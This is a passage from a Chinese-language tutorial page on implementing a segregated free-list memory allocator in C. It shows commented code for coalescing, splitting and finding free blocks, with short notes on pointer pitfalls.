</span><span id=__span-172-43><a id=__codelineno-172-43 name=__codelineno-172-43></a><span class=w>        </span><span class=n>PUT</span><span class=p>(</span><span class=n>GET_PRE</span><span class=p>(</span><span class=n>bp</span><span class=p>)</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=mi>1</span><span class=p>,</span><span class=w> </span><span class=n>GET_SUC</span><span class=p>(</span><span class=n>bp</span><span class=p>));</span><span class=w> </span><span class=c1>// 将该块的前驱节点的后继指针设置为指向该块的后继节点</span>
</span><span id=__span-172-44><a id=__codelineno-172-44 name=__codelineno-172-44></a><span class=w>        </span><span class=n>PUT</span><span class=p>(</span><span class=n>GET_SUC</span><span class=p>(</span><span class=n>bp</span><span class=p>),</span><span class=w> </span><span class=n>GET_PRE</span><span class=p>(</span><span class=n>bp</span><span class=p>));</span><span class=w>     </span><span class=c1>// 将该块的后继节点的前驱指针设置为指向该块的前驱节点</span>
</span><span id=__span-172-45><a id=__codelineno-172-45 name=__codelineno-172-45></a><span class=w>    </span><span class=p>}</span>
</span><span id=__span-172-46><a id=__codelineno-172-46 name=__codelineno-172-46></a><span class=p>}</span>
</span></code></pre></div></td></tr></table></div> <ul> <li>考虑四种情况就好，注释写得很详细了</li> <li>同样要注意指针的问题。比如：<code>GET_PRE(bp) + 1</code>是bp指向的块的前驱节点的后继指针，这里很容易 segmentation fault。</li> </ul> </li> <li> <h4 id=_25>合并与分割<a class=headerlink href=#_25 title="Permanent link">¶</a></h4> <p>合并操作还是与 Implict Free List 一样，是根据空闲块在堆中位置相邻来合并的，与链表排列无关：(但是要记得操作链表相应地insert或delete)</p> <div class="language-C highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-173-1> 1</a></span>
<span class=normal><a href=#__codelineno-173-2> 2</a></span>
<span class=normal><a href=#__codelineno-173-3> 3</a></span>
<span class=normal><a href=#__codelineno-173-4> 4</a></span>
<span class=normal><a href=#__codelineno-173-5> 5</a></span>
<span class=normal><a href=#__codelineno-173-6> 6</a></span>
<span class=normal><a href=#__codelineno-173-7> 7</a></span>
<span class=normal><a href=#__codelineno-173-8> 8</a></span>
<span class=normal><a href=#__codelineno-173-9> 9</a></span>
<span class=normal><a href=#__codelineno-173-10>10</a></span>
<span class=normal><a href=#__codelineno-173-11>11</a></span>
<span class=normal><a href=#__codelineno-173-12>12</a></span>
<span class=normal><a href=#__codelineno-173-13>13</a></span>
<span class=normal><a href=#__codelineno-173-14>14</a></span>
<span class=normal><a href=#__codelineno-173-15>15</a></span>
<span class=normal><a href=#__codelineno-173-16>16</a></span>
<span class=normal><a href=#__codelineno-173-17>17</a></span>
<span class=normal><a href=#__codelineno-173-18>18</a></span>
<span class=normal><a href=#__codelineno-173-19>19</a></span>
<span class=normal><a href=#__codelineno-173-20>20</a></span>
<span class=normal><a href=#__codelineno-173-21>21</a></span>
<span class=normal><a href=#__codelineno-173-22>22</a></span>
<span class=normal><a href=#__codelineno-173-23>23</a></span>
<span class=normal><a href=#__codelineno-173-24>24</a></span>
<span class=normal><a href=#__codelineno-173-25>25</a></span>
<span class=normal><a href=#__codelineno-173-26>26</a></span>
<span class=normal><a href=#__codelineno-173-27>27</a></span>
<span class=normal><a href=#__codelineno-173-28>28</a></span>
<span class=normal><a href=#__codelineno-173-29>29</a></span>
<span class=normal><a href=#__codelineno-173-30>30</a></span>
<span class=normal><a href=#__codelineno-173-31>31</a></span>
<span class=normal><a href=#__codelineno-173-32>32</a></span>
<span class=normal><a href=#__codelineno-173-33>33</a></span>
<span class=normal><a href=#__codelineno-173-34>34</a></span>
<span class=normal><a href=#__codelineno-173-35>35</a></span>
<span class=normal><a href=#__codelineno-173-36>36</a></span>
<span class=normal><a href=#__codelineno-173-37>37</a></span>
<span class=normal><a href=#__codelineno-173-38>38</a></span>
<span class=normal><a href=#__codelineno-173-39>39</a></span>
<span class=normal><a href=#__codelineno-173-40>40</a></span>
<span class=normal><a href=#__codelineno-173-41>41</a></span>
<span class=normal><a href=#__codelineno-173-42>42</a></span>
<span class=normal><a href=#__codelineno-173-43>43</a></span>
<span class=normal><a href=#__codelineno-173-44>44</a></span>
<span class=normal><a href=#__codelineno-173-45>45</a></span>
<span class=normal><a href=#__codelineno-173-46>46</a></span>
<span class=normal><a href=#__codelineno-173-47>47</a></span>
<span class=normal><a href=#__codelineno-173-48>48</a></span>
<span class=normal><a href=#__codelineno-173-49>49</a></span>
<span class=normal><a href=#__codelineno-173-50>50</a></span>
<span class=normal><a href=#__codelineno-173-51>51</a></span>
<span class=normal><a href=#__codelineno-173-52>52</a></span>
<span class=normal><a href=#__codelineno-173-53>53</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-173-1><a id=__codelineno-173-1 name=__codelineno-173-1></a><span class=cm>/*</span>
</span><span id=__span-173-2><a id=__codelineno-173-2 name=__codelineno-173-2></a><span class=cm>* 合并空闲块</span>
</span><span id=__span-173-3><a id=__codelineno-173-3 name=__codelineno-173-3></a><span class=cm>* @ bp: 指向刚被释放或新创建的空闲块的有效载荷指针</span>
</span><span id=__span-173-4><a id=__codelineno-173-4 name=__codelineno-173-4></a><span class=cm>* @ return: 指向合并后空闲块的有效载荷指针</span>
</span><span id=__span-173-5><a id=__codelineno-173-5 name=__codelineno-173-5></a><span class=cm>*/</span>
</span><span id=__span-173-6><a id=__codelineno-173-6 name=__codelineno-173-6></a><span class=kt>void</span><span class=w> </span><span class=o>*</span><span class=nf>coalesce</span><span class=p>(</span><span class=kt>void</span><span class=w> </span><span class=o>*</span><span class=n>bp</span><span class=p>)</span>
</span><span id=__span-173-7><a id=__codelineno-173-7 name=__codelineno-173-7></a><span class=p>{</span>
</span><span id=__span-173-8><a id=__codelineno-173-8 name=__codelineno-173-8></a><span class=w>    </span><span class=kt>size_t</span><span class=w> </span><span class=n>prev_alloc</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>GET_ALLOC</span><span class=p>(</span><span class=n>FTRP</span><span class=p>(</span><span class=n>PREV_BLKP</span><span class=p>(</span><span class=n>bp</span><span class=p>)));</span><span class=w>     </span><span class=cm>/* 前一块是否被分配 */</span>
</span><span id=__span-173-9><a id=__codelineno-173-9 name=__codelineno-173-9></a><span class=w>    </span><span class=kt>size_t</span><span class=w> </span><span class=n>next_alloc</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>GET_ALLOC</span><span class=p>(</span><span class=n>HDRP</span><span class=p>(</span><span class=n>NEXT_BLKP</span><span class=p>(</span><span class=n>bp</span><span class=p>)));</span><span class=w>     </span><span class=cm>/* 后一块是否被分配 */</span>
</span><span id=__span-173-10><a id=__codelineno-173-10 name=__codelineno-173-10></a><span class=w>    </span><span class=kt>size_t</span><span class=w> </span><span class=n>size</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>GET_SIZE</span><span class=p>(</span><span class=n>HDRP</span><span class=p>(</span><span class=n>bp</span><span class=p>));</span><span class=w>                       </span><span class=cm>/* 当前块大小 */</span>
</span><span id=__span-173-11><a id=__codelineno-173-11 name=__codelineno-173-11></a>
</span><span id=__span-173-12><a id=__codelineno-173-12 name=__codelineno-173-12></a><span class=w>    </span><span class=cm>/*</span>
</span><span id=__span-173-13><a id=__codelineno-173-13 name=__codelineno-173-13></a><span class=cm>    * 四种情况：前后都不空, 前不空后空, 前空后不空, 前后都空</span>
</span><span id=__span-173-14><a id=__codelineno-173-14 name=__codelineno-173-14></a><span class=cm>    */</span>
</span><span id=__span-173-15><a id=__codelineno-173-15 name=__codelineno-173-15></a><span class=w>    </span><span class=cm>/* 前后都不空 */</span>
</span><span id=__span-173-16><a id=__codelineno-173-16 name=__codelineno-173-16></a><span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>prev_alloc</span><span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span><span class=n>next_alloc</span><span class=p>)</span>
</span><span id=__span-173-17><a id=__codelineno-173-17 name=__codelineno-173-17></a><span class=w>    </span><span class=p>{</span>
</span><span id=__span-173-18><a id=__codelineno-173-18 name=__codelineno-173-18></a><span class=w>        </span><span class=n>insert</span><span class=p>(</span><span class=n>bp</span><span class=p>);</span>
</span><span id=__span-173-19><a id=__codelineno-173-19 name=__codelineno-173-19></a><span class=w>        </span><span class=k>return</span><span class=w> </span><span class=n>bp</span><span class=p>;</span>
</span><span id=__span-173-20><a id=__codelineno-173-20 name=__codelineno-173-20></a><span class=w>    </span><span class=p>}</span>
</span><span id=__span-173-21><a id=__codelineno-173-21 name=__codelineno-173-21></a><span class=w>    </span><span class=cm>/* 前不空后空 */</span>
</span><span id=__span-173-22><a id=__codelineno-173-22 name=__codelineno-173-22></a><span class=w>    </span><span class=k>else</span><span class=w> </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>prev_alloc</span><span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span><span class=o>!</span><span class=n>next_alloc</span><span class=p>)</span>
</span><span id=__span-173-23><a id=__codelineno-173-23 name=__codelineno-173-23></a><span class=w>    </span><span class=p>{</span>
</span><span id=__span-173-24><a id=__codelineno-173-24 name=__codelineno-173-24></a><span class=w>        </span><span class=n>delete</span><span class=p>(</span><span class=n>NEXT_BLKP</span><span class=p>(</span><span class=n>bp</span><span class=p>));</span><span class=w>                  </span><span class=c1>// 将后面的块从其链表中删除</span>
</span><span id=__span-173-25><a id=__codelineno-173-25 name=__codelineno-173-25></a><span class=w>        </span><span class=n>size</span><span class=w> </span><span class=o>+=</span><span class=w> </span><span class=n>GET_SIZE</span><span class=p>(</span><span class=n>HDRP</span><span class=p>(</span><span class=n>NEXT_BLKP</span><span class=p>(</span><span class=n>bp</span><span class=p>)));</span><span class=w>  </span><span class=c1>// 增加当前块大小</span>
</span><span id=__span-173-26><a id=__codelineno-173-26 name=__codelineno-173-26></a><span class=w>        </span><span class=n>PUT</span><span class=p>(</span><span class=n>HDRP</span><span class=p>(</span><span class=n>bp</span><span class=p>),</span><span class=w> </span><span class=n>PACK</span><span class=p>(</span><span class=n>size</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=p>));</span><span class=w>           </span><span class=c1>// 先修改头</span>
</span><span id=__span-173-27><a id=__codelineno-173-27 name=__codelineno-173-27></a><span class=w>        </span><span class=n>PUT</span><span class=p>(</span><span class=n>FTRP</span><span class=p>(</span><span class=n>bp</span><span class=p>),</span><span class=w> </span><span class=n>PACK</span><span class=p>(</span><span class=n>size</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=p>));</span><span class=w>           </span><span class=c1>// 根据头部中的大小来定位尾部</span>
</span><span id=__span-173-28><a id=__codelineno-173-28 name=__codelineno-173-28></a><span class=w>    </span><span class=p>}</span>
</span><span id=__span-173-29><a id=__codelineno-173-29 name=__codelineno-173-29></a><span class=w>    </span><span class=cm>/* 前空后不空 */</span>
</span><span id=__span-173-30><a id=__codelineno-173-30 name=__codelineno-173-30></a><span class=w>    </span><span class=k>else</span><span class=w> </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=o>!</span><span class=n>prev_alloc</span><span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span><span class=n>next_alloc</span><span class=p>)</span>
</span><span id=__span-173-31><a id=__codelineno-173-31 name=__codelineno-173-31></a><span class=w>    </span><span class=p>{</span>
</span><span id=__span-173-32><a id=__codelineno-173-32 name=__codelineno-173-32></a><span class=w>        </span><span class=cm>/* 将其前面的快从链表中删除 */</span>
</span><span id=__span-173-33><a id=__codelineno-173-33 name=__codelineno-173-33></a><span class=w>        </span><span class=n>delete</span><span class=p>(</span><span class=n>PREV_BLKP</span><span class=p>(</span><span class=n>bp</span><span class=p>));</span>
</span><span id=__span-173-34><a id=__codelineno-173-34 name=__codelineno-173-34></a><span class=w>        </span><span class=n>size</span><span class=w> </span><span class=o>+=</span><span class=w> </span><span class=n>GET_SIZE</span><span class=p>(</span><span class=n>HDRP</span><span class=p>(</span><span class=n>PREV_BLKP</span><span class=p>(</span><span class=n>bp</span><span class=p>)));</span><span class=w>  </span><span class=c1>// 增加当前块大小</span>
</span><span id=__span-173-35><a id=__codelineno-173-35 name=__codelineno-173-35></a><span class=w>        </span><span class=n>PUT</span><span class=p>(</span><span class=n>FTRP</span><span class=p>(</span><span class=n>bp</span><span class=p>),</span><span class=w> </span><span class=n>PACK</span><span class=p>(</span><span class=n>size</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=p>));</span>
</span><span id=__span-173-36><a id=__codelineno-173-36 name=__codelineno-173-36></a><span class=w>        </span><span class=n>PUT</span><span class=p>(</span><span class=n>HDRP</span><span class=p>(</span><span class=n>PREV_BLKP</span><span class=p>(</span><span class=n>bp</span><span class=p>)),</span><span class=w> </span><span class=n>PACK</span><span class=p>(</span><span class=n>size</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=p>));</span>
</span><span id=__span-173-37><a id=__codelineno-173-37 name=__codelineno-173-37></a><span class=w>        </span><span class=n>bp</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>PREV_BLKP</span><span class=p>(</span><span class=n>bp</span><span class=p>);</span><span class=w>                     </span><span class=c1>// 注意指针要变</span>
</span><span id=__span-173-38><a id=__codelineno-173-38 name=__codelineno-173-38></a><span class=w>    </span><span class=p>}</span>
</span><span id=__span-173-39><a id=__codelineno-173-39 name=__codelineno-173-39></a><span class=w>    </span><span class=cm>/* 都空 */</span>
</span><span id=__span-173-40><a id=__codelineno-173-40 name=__codelineno-173-40></a><span class=w>    </span><span class=k>else</span>
</span><span id=__span-173-41><a id=__codelineno-173-41 name=__codelineno-173-41></a><span class=w>    </span><span class=p>{</span>
</span><span id=__span-173-42><a id=__codelineno-173-42 name=__codelineno-173-42></a><span class=w>        </span><span class=cm>/* 将前后两个块都从其链表中删除 */</span>
</span><span id=__span-173-43><a id=__codelineno-173-43 name=__codelineno-173-43></a><span class=w>        </span><span class=n>delete</span><span class=p>(</span><span class=n>NEXT_BLKP</span><span class=p>(</span><span class=n>bp</span><span class=p>));</span>
</span><span id=__span-173-44><a id=__codelineno-173-44 name=__codelineno-173-44></a><span class=w>        </span><span class=n>delete</span><span class=p>(</span><span class=n>PREV_BLKP</span><span class=p>(</span><span class=n>bp</span><span class=p>));</span>
</span><span id=__span-173-45><a id=__codelineno-173-45 name=__codelineno-173-45></a><span class=w>        </span><span class=n>size</span><span class=w> </span><span class=o>+=</span><span class=w> </span><span class=n>GET_SIZE</span><span class=p>(</span><span class=n>HDRP</span><span class=p>(</span><span class=n>PREV_BLKP</span><span class=p>(</span><span class=n>bp</span><span class=p>)))</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>GET_SIZE</span><span class=p>(</span><span class=n>FTRP</span><span class=p>(</span><span class=n>NEXT_BLKP</span><span class=p>(</span><span class=n>bp</span><span class=p>)));</span><span class=w>  </span><span class=c1>// 增加当前块大小</span>
</span><span id=__span-173-46><a id=__codelineno-173-46 name=__codelineno-173-46></a><span class=w>        </span><span class=n>PUT</span><span class=p>(</span><span class=n>FTRP</span><span class=p>(</span><span class=n>NEXT_BLKP</span><span class=p>(</span><span class=n>bp</span><span class=p>)),</span><span class=w> </span><span class=n>PACK</span><span class=p>(</span><span class=n>size</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=p>));</span>
</span><span id=__span-173-47><a id=__codelineno-173-47 name=__codelineno-173-47></a><span class=w>        </span><span class=n>PUT</span><span class=p>(</span><span class=n>HDRP</span><span class=p>(</span><span class=n>PREV_BLKP</span><span class=p>(</span><span class=n>bp</span><span class=p>)),</span><span class=w> </span><span class=n>PACK</span><span class=p>(</span><span class=n>size</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=p>));</span>
</span><span id=__span-173-48><a id=__codelineno-173-48 name=__codelineno-173-48></a><span class=w>        </span><span class=n>bp</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>PREV_BLKP</span><span class=p>(</span><span class=n>bp</span><span class=p>);</span>
</span><span id=__span-173-49><a id=__codelineno-173-49 name=__codelineno-173-49></a><span class=w>    </span><span class=p>}</span>
</span><span id=__span-173-50><a id=__codelineno-173-50 name=__codelineno-173-50></a><span class=w>    </span><span class=cm>/* 空闲块准备好后,将其插入合适位置 */</span>
</span><span id=__span-173-51><a id=__codelineno-173-51 name=__codelineno-173-51></a><span class=w>    </span><span class=n>insert</span><span class=p>(</span><span class=n>bp</span><span class=p>);</span>
</span><span id=__span-173-52><a id=__codelineno-173-52 name=__codelineno-173-52></a><span class=w>    </span><span class=k>return</span><span class=w> </span><span class=n>bp</span><span class=p>;</span>
</span><span id=__span-173-53><a id=__codelineno-173-53 name=__codelineno-173-53></a><span class=p>}</span>
</span></code></pre></div></td></tr></table></div> <ul> <li>操作与 Implict Free List 几乎相同</li> <li>额外的操作就是合并前要将前后的空闲块从它的原链表中删除，合并完成后要将新的空闲块插入对应的空闲链表中</li> </ul> <p>分离空闲块也只是加入了将分离出来的空闲块插入相应空闲链表的操作:</p> <div class="language-C highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-174-1> 1</a></span>
<span class=normal><a href=#__codelineno-174-2> 2</a></span>
<span class=normal><a href=#__codelineno-174-3> 3</a></span>
<span class=normal><a href=#__codelineno-174-4> 4</a></span>
<span class=normal><a href=#__codelineno-174-5> 5</a></span>
<span class=normal><a href=#__codelineno-174-6> 6</a></span>
<span class=normal><a href=#__codelineno-174-7> 7</a></span>
<span class=normal><a href=#__codelineno-174-8> 8</a></span>
<span class=normal><a href=#__codelineno-174-9> 9</a></span>
<span class=normal><a href=#__codelineno-174-10>10</a></span>
<span class=normal><a href=#__codelineno-174-11>11</a></span>
<span class=normal><a href=#__codelineno-174-12>12</a></span>
<span class=normal><a href=#__codelineno-174-13>13</a></span>
<span class=normal><a href=#__codelineno-174-14>14</a></span>
<span class=normal><a href=#__codelineno-174-15>15</a></span>
<span class=normal><a href=#__codelineno-174-16>16</a></span>
<span class=normal><a href=#__codelineno-174-17>17</a></span>
<span class=normal><a href=#__codelineno-174-18>18</a></span>
<span class=normal><a href=#__codelineno-174-19>19</a></span>
<span class=normal><a href=#__codelineno-174-20>20</a></span>
<span class=normal><a href=#__codelineno-174-21>21</a></span>
<span class=normal><a href=#__codelineno-174-22>22</a></span>
<span class=normal><a href=#__codelineno-174-23>23</a></span>
<span class=normal><a href=#__codelineno-174-24>24</a></span>
<span class=normal><a href=#__codelineno-174-25>25</a></span>
<span class=normal><a href=#__codelineno-174-26>26</a></span>
<span class=normal><a href=#__codelineno-174-27>27</a></span>
<span class=normal><a href=#__codelineno-174-28>28</a></span>
<span class=normal><a href=#__codelineno-174-29>29</a></span>
<span class=normal><a href=#__codelineno-174-30>30</a></span>
<span class=normal><a href=#__codelineno-174-31>31</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-174-1><a id=__codelineno-174-1 name=__codelineno-174-1></a><span class=cm>/*</span>
</span><span id=__span-174-2><a id=__codelineno-174-2 name=__codelineno-174-2></a><span class=cm>* 分离空闲块</span>
</span><span id=__span-174-3><a id=__codelineno-174-3 name=__codelineno-174-3></a><span class=cm>* @ bp: 空闲块的有效载荷指针</span>
</span><span id=__span-174-4><a id=__codelineno-174-4 name=__codelineno-174-4></a><span class=cm>* @ asize: 请求分配的对齐后的内存大小</span>
</span><span id=__span-174-5><a id=__codelineno-174-5 name=__codelineno-174-5></a><span class=cm>*/</span>
</span><span id=__span-174-6><a id=__codelineno-174-6 name=__codelineno-174-6></a><span class=kt>void</span><span class=w> </span><span class=nf>place</span><span class=p>(</span><span class=kt>void</span><span class=w> </span><span class=o>*</span><span class=n>bp</span><span class=p>,</span><span class=w> </span><span class=kt>size_t</span><span class=w> </span><span class=n>asize</span><span class=p>)</span>
</span><span id=__span-174-7><a id=__codelineno-174-7 name=__codelineno-174-7></a><span class=p>{</span>
</span><span id=__span-174-8><a id=__codelineno-174-8 name=__codelineno-174-8></a><span class=w>    </span><span class=kt>size_t</span><span class=w> </span><span class=n>csize</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>GET_SIZE</span><span class=p>(</span><span class=n>HDRP</span><span class=p>(</span><span class=n>bp</span><span class=p>));</span>
</span><span id=__span-174-9><a id=__codelineno-174-9 name=__codelineno-174-9></a>
</span><span id=__span-174-10><a id=__codelineno-174-10 name=__codelineno-174-10></a><span class=w>    </span><span class=n>delete</span><span class=p>(</span><span class=n>bp</span><span class=p>);</span><span class=w> </span><span class=c1>// 块已分配，从空闲链表中删除</span>
</span><span id=__span-174-11><a id=__codelineno-174-11 name=__codelineno-174-11></a><span class=w>    </span><span class=cm>/* 判断是否能够分离空闲块 */</span>
</span><span id=__span-174-12><a id=__codelineno-174-12 name=__codelineno-174-12></a><span class=w>    </span><span class=k>if</span><span class=w> </span><span class=p>((</span><span class=n>csize</span><span class=w> </span><span class=o>-</span><span class=w> </span><span class=n>asize</span><span class=p>)</span><span class=w> </span><span class=o>&gt;=</span><span class=w> </span><span class=mi>2</span><span class=w> </span><span class=o>*</span><span class=w> </span><span class=n>DSIZE</span><span class=p>)</span><span class=w> </span>
</span><span id=__span-174-13><a id=__codelineno-174-13 name=__codelineno-174-13></a><span class=w>    </span><span class=p>{</span>
</span><span id=__span-174-14><a id=__codelineno-174-14 name=__codelineno-174-14></a><span class=w>        </span><span class=c1>// 2 * DSIZE是最小空闲块大小要求，保证剩余空间可以形成一个有效的空闲块</span>
</span><span id=__span-174-15><a id=__codelineno-174-15 name=__codelineno-174-15></a><span class=w>        </span><span class=c1>// 有效空闲块至少需要：头部(4字节) + 有效载荷(至少4字节) + 脚部(4字节) = 12字节，但为了对齐要求，设置为16字节</span>
</span><span id=__span-174-16><a id=__codelineno-174-16 name=__codelineno-174-16></a><span class=w>        </span><span class=n>PUT</span><span class=p>(</span><span class=n>HDRP</span><span class=p>(</span><span class=n>bp</span><span class=p>),</span><span class=w> </span><span class=n>PACK</span><span class=p>(</span><span class=n>asize</span><span class=p>,</span><span class=w> </span><span class=mi>1</span><span class=p>));</span>
</span><span id=__span-174-17><a id=__codelineno-174-17 name=__codelineno-174-17></a><span class=w>        </span><span class=n>PUT</span><span class=p>(</span><span class=n>FTRP</span><span class=p>(</span><span class=n>bp</span><span class=p>),</span><span class=w> </span><span class=n>PACK</span><span class=p>(</span><span class=n>asize</span><span class=p>,</span><span class=w> </span><span class=mi>1</span><span class=p>));</span>
</span><span id=__span-174-18><a id=__codelineno-174-18 name=__codelineno-174-18></a><span class=w>        </span><span class=cm>/* bp指向空闲块 */</span>
</span><span id=__span-174-19><a id=__codelineno-174-19 name=__codelineno-174-19></a><span class=w>        </span><span class=n>bp</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>NEXT_BLKP</span><span class=p>(</span><span class=n>bp</span><span class=p>);</span>
</span><span id=__span-174-20><a id=__codelineno-174-20 name=__codelineno-174-20></a><span class=w>        </span><span class=n>PUT</span><span class=p>(</span><span class=n>HDRP</span><span class=p>(</span><span class=n>bp</span><span class=p>),</span><span class=w> </span><span class=n>PACK</span><span class=p>(</span><span class=n>csize</span><span class=w> </span><span class=o>-</span><span class=w> </span><span class=n>asize</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=p>));</span>
</span><span id=__span-174-21><a id=__codelineno-174-21 name=__codelineno-174-21></a><span class=w>        </span><span class=n>PUT</span><span class=p>(</span><span class=n>FTRP</span><span class=p>(</span><span class=n>bp</span><span class=p>),</span><span class=w> </span><span class=n>PACK</span><span class=p>(</span><span class=n>csize</span><span class=w> </span><span class=o>-</span><span class=w> </span><span class=n>asize</span><span class=p>,</span><span class=w> </span><span class=mi>0</span><span class=p>));</span>
</span><span id=__span-174-22><a id=__codelineno-174-22 name=__codelineno-174-22></a><span class=w>        </span><span class=cm>/* 加入分离出来的空闲块 */</span>
</span><span id=__span-174-23><a id=__codelineno-174-23 name=__codelineno-174-23></a><span class=w>        </span><span class=n>insert</span><span class=p>(</span><span class=n>bp</span><span class=p>);</span>
</span><span id=__span-174-24><a id=__codelineno-174-24 name=__codelineno-174-24></a><span class=w>    </span><span class=p>}</span>
</span><span id=__span-174-25><a id=__codelineno-174-25 name=__codelineno-174-25></a><span class=w>    </span><span class=cm>/* 设置为填充：这部分剩余空间被称为内部碎片 */</span>
</span><span id=__span-174-26><a id=__codelineno-174-26 name=__codelineno-174-26></a><span class=w>    </span><span class=k>else</span>
</span><span id=__span-174-27><a id=__codelineno-174-27 name=__codelineno-174-27></a><span class=w>    </span><span class=p>{</span>
</span><span id=__span-174-28><a id=__codelineno-174-28 name=__codelineno-174-28></a><span class=w>        </span><span class=n>PUT</span><span class=p>(</span><span class=n>HDRP</span><span class=p>(</span><span class=n>bp</span><span class=p>),</span><span class=w> </span><span class=n>PACK</span><span class=p>(</span><span class=n>csize</span><span class=p>,</span><span class=w> </span><span class=mi>1</span><span class=p>));</span>
</span><span id=__span-174-29><a id=__codelineno-174-29 name=__codelineno-174-29></a><span class=w>        </span><span class=n>PUT</span><span class=p>(</span><span class=n>FTRP</span><span class=p>(</span><span class=n>bp</span><span class=p>),</span><span class=w> </span><span class=n>PACK</span><span class=p>(</span><span class=n>csize</span><span class=p>,</span><span class=w> </span><span class=mi>1</span><span class=p>));</span>
</span><span id=__span-174-30><a id=__codelineno-174-30 name=__codelineno-174-30></a><span class=w>    </span><span class=p>}</span>
</span><span id=__span-174-31><a id=__codelineno-174-31 name=__codelineno-174-31></a><span class=p>}</span>
</span></code></pre></div></td></tr></table></div> </li> <li> <h4 id=_26>分配块<a class=headerlink href=#_26 title="Permanent link">¶</a></h4> <p>Segregated Fit 的分配策略就很清晰了：</p> <ul> <li>先从对应的大小类的空闲链表中查找</li> <li>如果找不到，则到下一个更大的大小类查找</li> <li>如果都找不到，则扩展堆</li> </ul> <div class="language-C highlight"><table class=highlighttable><tr><td class=linenos><div class=linenodiv><pre><span></span><span class=normal><a href=#__codelineno-175-1> 1</a></span>
<span class=normal><a href=#__codelineno-175-2> 2</a></span>
<span class=normal><a href=#__codelineno-175-3> 3</a></span>
<span class=normal><a href=#__codelineno-175-4> 4</a></span>
<span class=normal><a href=#__codelineno-175-5> 5</a></span>
<span class=normal><a href=#__codelineno-175-6> 6</a></span>
<span class=normal><a href=#__codelineno-175-7> 7</a></span>
<span class=normal><a href=#__codelineno-175-8> 8</a></span>
<span class=normal><a href=#__codelineno-175-9> 9</a></span>
<span class=normal><a href=#__codelineno-175-10>10</a></span>
<span class=normal><a href=#__codelineno-175-11>11</a></span>
<span class=normal><a href=#__codelineno-175-12>12</a></span>
<span class=normal><a href=#__codelineno-175-13>13</a></span>
<span class=normal><a href=#__codelineno-175-14>14</a></span>
<span class=normal><a href=#__codelineno-175-15>15</a></span>
<span class=normal><a href=#__codelineno-175-16>16</a></span>
<span class=normal><a href=#__codelineno-175-17>17</a></span>
<span class=normal><a href=#__codelineno-175-18>18</a></span>
<span class=normal><a href=#__codelineno-175-19>19</a></span>
<span class=normal><a href=#__codelineno-175-20>20</a></span>
<span class=normal><a href=#__codelineno-175-21>21</a></span>
<span class=normal><a href=#__codelineno-175-22>22</a></span>
<span class=normal><a href=#__codelineno-175-23>23</a></span>
<span class=normal><a href=#__codelineno-175-24>24</a></span>
<span class=normal><a href=#__codelineno-175-25>25</a></span>
<span class=normal><a href=#__codelineno-175-26>26</a></span></pre></div></td><td class=code><div><pre><span></span><code><span id=__span-175-1><a id=__codelineno-175-1 name=__codelineno-175-1></a><span class=cm>/*</span>
</span><span id=__span-175-2><a id=__codelineno-175-2 name=__codelineno-175-2></a><span class=cm>* 适配</span>
</span><span id=__span-175-3><a id=__codelineno-175-3 name=__codelineno-175-3></a><span class=cm>*/</span>
</span><span id=__span-175-4><a id=__codelineno-175-4 name=__codelineno-175-4></a><span class=kt>void</span><span class=w> </span><span class=o>*</span><span class=nf>find_fit</span><span class=p>(</span><span class=kt>size_t</span><span class=w> </span><span class=n>asize</span><span class=p>)</span>
</span><span id=__span-175-5><a id=__codelineno-175-5 name=__codelineno-175-5></a><span class=p>{</span>
</span><span id=__span-175-6><a id=__codelineno-175-6 name=__codelineno-175-6></a><span class=w>    </span><span class=kt>int</span><span class=w> </span><span class=n>num</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>search</span><span class=p>(</span><span class=n>asize</span><span class=p>);</span>
</span><span id=__span-175-7><a id=__codelineno-175-7 name=__codelineno-175-7></a><span class=w>    </span><span class=kt>unsigned</span><span class=w> </span><span class=kt>int</span><span class=o>*</span><span class=w> </span><span class=n>bp</span><span class=p>;</span>
</span><span id=__span-175-8><a id=__codelineno-175-8 name=__codelineno-175-8></a><span class=w>    </span><span class=cm>/* 如果找不到合适的块，那么就搜索下一个更大的大小类 */</span>
</span><span id=__span-175-9><a id=__codelineno-175-9 name=__codelineno-175-9></a><span class=w>    </span><span class=k>while</span><span class=w> </span><span class=p>(</span><span class=n>num</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=n>CLASS_SIZE</span><span class=p>)</span><span class=w> </span>
</span><span id=__span-175-10><a id=__codelineno-175-10 name=__codelineno-175-10></a><span class=w>    </span><span class=p>{</span>
</span><span id=__span-175-11><a id=__codelineno-175-11 name=__codelineno-175-11></a><span class=w>        </span><span class=n>bp</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>GET_HEAD</span><span class=p>(</span><span class=n>num</span><span class=p>);</span>
</span><span id=__span-175-12><a id=__codelineno-175-12 name=__codelineno-175-12></a><span class=w>        </span><span class=cm>/* 不为空则寻找 */</span>
